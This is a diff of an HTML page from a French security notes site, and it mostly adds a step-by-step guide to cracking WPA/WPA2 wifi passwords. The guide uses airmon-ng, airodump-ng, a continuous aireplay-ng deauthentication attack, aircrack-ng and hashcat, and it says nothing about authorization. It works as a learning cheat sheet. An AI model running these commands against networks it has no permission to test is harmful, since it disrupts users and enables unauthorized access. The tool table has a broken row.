@@ -5,24 +5,23 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="canonical" href="https://cyber-puit-de-connaissances.com/wifi-cracking/" />
       <link rel="shortcut icon" href="../img/favicon.ico" />
-    <title>Cracker le mdp d'un wifi - Cyber-puit de connaissances</title>
+    <title>Wifi mdp cracking - Cyber-puit de connaissances</title>
     <link rel="stylesheet" href="../css/theme.css" />
     <link rel="stylesheet" href="../css/theme_extra.css" />
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
     
       <script>
         // Current page data
-        var mkdocs_page_name = "Cracker le mdp d\u0027un wifi";
+        var mkdocs_page_name = "Wifi mdp cracking";
         var mkdocs_page_input_path = "wifi-cracking.md";
         var mkdocs_page_url = "/wifi-cracking/";
       </script>
     
-    <script src="../js/jquery-3.6.0.min.js" defer></script>
     <!--[if lt IE 9]>
       <script src="../js/html5shiv.min.js"></script>
     <![endif]-->
-      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
-      <script>hljs.initHighlightingOnLoad();</script> 
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
 </head>
 
 <body class="wy-body-for-nav" role="document">
@@ -46,7 +45,7 @@
               </ul>
               <p class="caption"><span class="caption-text">Utile</span></p>
               <ul>
-                  <li class="toctree-l1"><a class="reference internal" href="../ecoute_ports/">Ecoute de ports</a>
+                  <li class="toctree-l1"><a class="" href="../ecoute_ports.md">Ecoute de ports</a>
                   </li>
                   <li class="toctree-l1"><a class="reference internal" href="../sites_utiles/">Les sites utiles</a>
                   </li>
@@ -93,7 +92,7 @@
                   </li>
               </ul>
               <p class="caption"><span class="caption-text">Exploits</span></p>
-              <ul>
+              <ul class="current">
                   <li class="toctree-l1"><a class="reference internal" href="#">Les protocoles</a>
     <ul>
                 <li class="toctree-l2"><a class="reference internal" href="../SMB_exploit_bases/">SMB</a>
@@ -113,6 +112,54 @@
                   <li class="toctree-l1"><a class="reference internal" href="#">Web</a>
     <ul>
                 <li class="toctree-l2"><a class="reference internal" href="../web_exploit_bases/">Les bases</a>
+                </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1 current"><a class="reference internal current" href="#">Wifi</a>
+    <ul class="current">
+                <li class="toctree-l2 current"><a class="reference internal current" href="./">Wifi mdp cracking</a>
+    <ul class="current">
+    <li class="toctree-l3"><a class="reference internal" href="#les-types-de-wifi">Les types de wifi :</a>
+        <ul>
+    <li class="toctree-l4"><a class="reference internal" href="#wep">WEP</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#wpa2-psk">WPA2-PSK</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#wpa2-eap">WPA2-EAP</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#type-dauthentification">Type d'authentification</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerabilite">Vulnérabilité</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#outil-utilise">Outil utilisé</a>
+        <ul>
+    <li class="toctree-l4"><a class="reference internal" href="#package-de-aircrack-ng">Package de aircrack-ng</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#attaque-de-reseau-wpa">Attaque de réseau WPA</a>
+        <ul>
+    <li class="toctree-l4"><a class="reference internal" href="#mettre-linterface-reseau-en-mode-monitor">Mettre l'interface réseau en mode monitor</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#decouvrir-les-reseaux-wifi">Découvrir les réseaux wifi</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#capturer-les-paquets">Capturer les paquets</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#deauthentifier-un-client">Déauthentifier un client</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#retirer-le-mode-monitor">Retirer le mode monitor</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#lire-les-resultats-captures-non-obligatoire">Lire les résultats capturés (non obligatoire)</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#cracker-le-handshake-dictionnaire">Cracker le handshake - Dictionnaire</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#crack-le-handshake-bruteforce-pour-mdp-non-conventionnels">Crack le handshake - Bruteforce (pour mdp non conventionnels)</a>
+    </li>
+        </ul>
+    </li>
+    </ul>
                 </li>
     </ul>
                   </li>
@@ -169,7 +216,9 @@
         <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
   <ul class="wy-breadcrumbs">
     <li><a href=".." class="icon icon-home" aria-label="Docs"></a> &raquo;</li>
-      <li>Cracker le mdp d'un wifi</li>
+          <li>Exploits &raquo;</li>
+          <li>Wifi &raquo;</li>
+      <li class="breadcrumb-item active">Wifi mdp cracking</li>
     <li class="wy-breadcrumbs-aside">
     </li>
   </ul>
@@ -194,10 +243,214 @@
 A noter que le nombre de caractère minimal pour un mdp de WPA2 c'est 8.</p>
 <p>Les clés du WPA sont dérivées de l'ESSID (Un SSID (Le "nom" du réseau que vous voyez lorsque vous essayez de vous connecter) qui <em>peut</em> s'appliquer à plusieurs points d'accès, par exemple un bureau d'entreprise, formant normalement un réseau plus grand. Pour Aircrack, ils font normalement référence au réseau que vous attaquez.) et du mot de passe du réseau. L'ESSID agit comme un sel, ce qui rend les attaques par dictionnaire plus difficiles. Cela signifie que pour un mot de passe donné, la clé variera toujours pour chaque point d'accès. Cela signifie qu'à moins de calculer à l'avance le dictionnaire pour ce seul point d'accès/adresse MAC, vous devrez essayer des mots de passe jusqu'à ce que vous trouviez le bon.</p>
 <h2 id="outil-utilise">Outil utilisé</h2>
-<p>Pour les réseaux wifi on va utiliser l'outil aircrack-ng pour le bruteforce : <a href="https://aircrack-ng.org">site de l'outil</a></p>
+<p>Pour les réseaux wifi on va utiliser l'outil <strong>aircrack-ng</strong> pour le bruteforce : <a href="https://aircrack-ng.org">site de l'outil</a></p>
+<h3 id="package-de-aircrack-ng">Package de aircrack-ng</h3>
+<table>
+<thead>
+<tr>
+<th>Nom du package</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>aircrack-ng</td>
+<td>outil de bruteforce</td>
+</tr>
+<tr>
+<td>airmon-ng</td>
+<td>outil pour mettre une interface en mode monitor</td>
+</tr>
+<tr>
+<td>airodump-ng</td>
+<td>outil pour capturer les paquets sur un réseau wifi</td>
+</tr>
+<tr>
+<td>aireplay-ng</td>
+<td>outil pour injecter des paquets sur un réseau wifi</td>
+</tr>
+<tr>
+<td>airdecap-ng</td>
+<td>outil pour décrypter les paquets capturés</td>
+</tr>
+<tr>
+<td>airbase-ng</td>
+<td>outil pour créer un point d'accès wifi</td>
+</tr>
+<tr>
+<td>airtun-ng</td>
+<td>outil pour créer un tunnel wifi</td>
+</tr>
+<tr>
+<td>packetforge-ng</td>
+<td>outil pour créer des paquets wifi</td>
+</tr>
+<tr>
+<td>airdecloak-ng</td>
+<td>outil pour décrypter les paquets capturés</td>
+</tr>
+<tr>
+<td>airolib-ng</td>
+<td>outil pour gérer les bases de données de mots de passe</td>
+</tr>
+<tr>
+<td>airserv-ng</td>
+<td>outil pour créer un serveur de capture de paquets</td>
+</tr>
+<tr>
+<td>buddy-ng</td>
+<td>outil pour créer un serveur de capture de paquets</td>
+</tr>
+<tr>
+<td>ivstools</td>
+<td>outil pour gérer les fi</td>
+</tr>
+<tr>
+<td>chiers .ivs</td>
+<td></td>
+</tr>
+<tr>
+<td>easside-ng</td>
+<td>outil pour décrypter les paquets capturés</td>
+</tr>
+<tr>
+<td>tkiptun-ng</td>
+<td>outil pour décrypter les paquets capturés</td>
+</tr>
+<tr>
+<td>wesside-ng</td>
+<td>outil pour décrypter les paquets capturés</td>
+</tr>
+</tbody>
+</table>
+<h2 id="attaque-de-reseau-wpa">Attaque de réseau WPA</h2>
+<h3 id="mettre-linterface-reseau-en-mode-monitor">Mettre l'interface réseau en mode monitor</h3>
+<p>Si l'interface réseau n'est pas en mode monitor, on va utiliser l'outil <strong>airmon-ng</strong> pour la mettre en mode monitor (petit tips : pour voir l'état de l'interface réseau sans fil on peut utiliser la commande <code>iwconfig</code>). </p>
+<p>La première étape est de terminer tous les processus qui utilisent l'interface réseau sans fil. Pour cela, on va utiliser la commande suivante : </p>
+<pre><code class="language-bash">airmon-ng check kill
+</code></pre>
+<p>Ensuite, on va mettre l'interface réseau sans fil en mode monitor.
+Pour cela, on va utiliser la commande suivante :</p>
+<pre><code class="language-bash">airmon-ng start &lt;interface&gt;
+</code></pre>
+<p>Exemple avec wlan0 :</p>
+<pre><code class="language-bash">airmon-ng start wlan0
+</code></pre>
+<p>Le nom de l'interface réseau sans fil en mode monitor est le nom de l'interface réseau sans fil suivi de <strong>mon</strong>. Exemple : <strong>wlan0</strong>  devient <strong>wlan0mon</strong></p>
+<h3 id="decouvrir-les-reseaux-wifi">Découvrir les réseaux wifi</h3>
+<p>Pour découvrir les réseaux wifi à proximité, on va utiliser l'outil <strong>airodump-ng</strong>. Pour cela, on va utiliser la commande suivante :</p>
+<pre><code class="language-bash">airodump-ng &lt;interface&gt;
+</code></pre>
+<p>Petit rappel, il faut que l'interface soit en mode monitor soit avec le <strong>mon</strong> à la fin du nom de l'interface.</p>
+<p>Si on ne veut afficher qu'une seule adresse MAC, on peut utiliser la commande suivante :</p>
+<pre><code class="language-bash">airodump-ng &lt;interface&gt; --bssid &lt;bssid&gt;
+</code></pre>
+<p>ou </p>
+<pre><code class="language-bash">airodump-ng &lt;interface&gt; -d &lt;MAC address&gt;
+</code></pre>
+<h3 id="capturer-les-paquets">Capturer les paquets</h3>
+<p>Pour attaquer un réseau wifi WPA, il faut d'abord capturer le handshake. Pour cela, on va utiliser l'outil <strong>airodump-ng</strong> qui va nous permettre de capturer les paquets qui transitent sur le réseau wifi. Pour cela, on va utiliser la commande suivante :</p>
+<pre><code class="language-bash">airodump-ng &lt;interface&gt; -c &lt;channel&gt; --bssid &lt;bssid&gt; -w &lt;file&gt;
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>interface</td>
+<td>nom de l'interface réseau sans fil en mode monitor</td>
+</tr>
+<tr>
+<td>channel</td>
+<td>canal du réseau wifi</td>
+</tr>
+<tr>
+<td>bssid</td>
+<td>adresse MAC du point d'accès</td>
+</tr>
+<tr>
+<td>file</td>
+<td>nom du fichier de sortie dans lequel va s'écrire les paquets capturés</td>
+</tr>
+</tbody>
+</table>
+<h3 id="deauthentifier-un-client">Déauthentifier un client</h3>
+<p>Pendant que la commande de capture de paquet est lancée, on va utiliser l'outil <strong>aireplay-ng</strong> pour déauthentifier un client du réseau wifi. Cela va obliger le client à se réauthentifier. Si tout se passe bien, on devrait capturer cette réauthentification dans notre fichier de sortie de airodump-ng.
+Pour déauthentifier un client, on va utiliser la commande suivante :</p>
+<pre><code class="language-bash">aireplay-ng --deauth 0 -a &lt;bssid&gt; -D &lt;interface&gt;
+</code></pre>
+<p>Ci-dessus, on déauthentifie tous les clients du réseau wifi. Si on veut déauthentifier un seul client, on peut utiliser la commande suivante :</p>
+<pre><code class="language-bash">aireplay-ng --deauth 0 -a &lt;bssid&gt; -c &lt;client&gt; &lt;interface&gt;
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>deauth</td>
+<td>nombre de déauthentification à envoyer (0 signifie une attaque continue)</td>
+</tr>
+<tr>
+<td>a</td>
+<td>adresse MAC du point d'accès</td>
+</tr>
+<tr>
+<td>interface</td>
+<td>nom de l'interface réseau sans fil en mode monitor</td>
+</tr>
+<tr>
+<td>c</td>
+<td>adresse MAC du client à déauthentifier</td>
+</tr>
+</tbody>
+</table>
+<p>En cas d'erreur : <code>wlan0mon is on channel 3, but the AP uses channel 11</code> on peut utiliser la commande suivante :</p>
+<pre><code class="language-bash">sudo airmon-ng start wlan0mon 3
+</code></pre>
+<p>Puis relancer la commande de déauthentification.</p>
+<h3 id="retirer-le-mode-monitor">Retirer le mode monitor</h3>
+<p>Une fois que l'on a capturé le handshake, on peut retirer le mode monitor de l'interface réseau sans fil. Pour cela, on va utiliser la commande suivante :</p>
+<pre><code class="language-bash">airmon-ng stop &lt;interface&gt;
+</code></pre>
+<h3 id="lire-les-resultats-captures-non-obligatoire">Lire les résultats capturés (non obligatoire)</h3>
+<p>On a donné un nom à notre fichier de sortie. Cela va générer 5 fichiers :
+- <file>.csv
+- <file>-01.cap
+- <file>-01.csv
+- <file>-01.kismet.csv</p>
+<p>Le fichier qui nous intéresse est le fichier <strong><file>-01.cap</strong>. C'est dans ce fichier que se trouve le handshake.</p>
+<p>On utilise peut donc Wireshark pour lire le fichier <strong><file>-01.cap</strong>. On peut utiliser la commande suivante :</p>
+<pre><code class="language-bash">wireshark &lt;file&gt;-01.cap
+</code></pre>
+<p>On met un filtre pour identifier le handshake : <strong>eapol</strong> (le handshake est composé de 4 paquets eapol).</p>
+<p>Et on cherche la suite des 4 paquets numérotés de 1 à 4.</p>
+<h3 id="cracker-le-handshake-dictionnaire">Cracker le handshake - Dictionnaire</h3>
+<p>Pour cracker le handshake, on va utiliser l'outil <strong>aircrack-ng</strong>. Pour cela, on va utiliser la commande suivante :</p>
+<pre><code class="language-bash">aircrack-ng &lt;file&gt;-01.cap -w &lt;wordlist&gt;
+</code></pre>
+<p>Laisser tourner ... ET VOILA !</p>
+<p>Remarque : Cette technique fonctionne uniquement avec des mots de passe faibles. Pour des mots de passe plus complexes, il faut utiliser une autre technique. </p>
+<h3 id="crack-le-handshake-bruteforce-pour-mdp-non-conventionnels">Crack le handshake - Bruteforce (pour mdp non conventionnels)</h3>
+<p>Pour faire du bruteforce, on va utiliser <strong>hashcat</strong>. Mais pour ça il faut convertir le fichier contenant le hash du handshake en un format compréhensible par hashcat et correspondant au bon type de hash. Avant on aurait utilisé <strong>cap2hccapx</strong> mais maitenant le format hccapx n'est plus utilisé. Il faut le convertir en <strong>hc22000</strong>. Je l'ai fait en utilisant un site web (pas une bonne pratique du tout, il doit exister un outil)</p>
+<p>Ensuite il faut lacer hashcat en précisant le type d'attaque (bruteforce ou dictionnaire ou les 2) et le type de hash (22000 pour du wpa/wpa2). </p>
+<pre><code class="language-bash">hashcat -a &lt;type d'attaque&gt; -m 22000 &lt;file&gt;.hc22000 &lt;wordlist&gt;
+</code></pre>
+<p><strong>Pas besoin de wordlist si l'attaque est bruteforce uniquement (<code>-a 3</code>)</strong></p>
               
             </div>
           </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../web_exploit_bases/" class="btn btn-neutral float-left" title="Les bases"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../MySQL_exploit_bases/" class="btn btn-neutral float-right" title="MySQL">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
 
   <hr/>
 
@@ -219,17 +472,22 @@ A noter que le nombre de caractère minimal pour un mdp de WPA2 c'est 8.</p>
   <span class="rst-current-version" data-toggle="rst-current-version">
     
     
+      <span><a href="../web_exploit_bases/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../MySQL_exploit_bases/" style="color: #fcfcfc">Next &raquo;</a></span>
     
   </span>
 </div>
-    <script>var base_url = '..';</script>
-    <script src="../js/theme_extra.js" defer></script>
-    <script src="../js/theme.js" defer></script>
-      <script src="../search/main.js" defer></script>
-    <script defer>
-        window.onload = function () {
+    <script src="../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "..";</script>
+    <script src="../js/theme_extra.js"></script>
+    <script src="../js/theme.js"></script>
+      <script src="../search/main.js"></script>
+    <script>
+        jQuery(function () {
             SphinxRtdTheme.Navigation.enable(true);
-        };
+        });
     </script>
 
 </body>
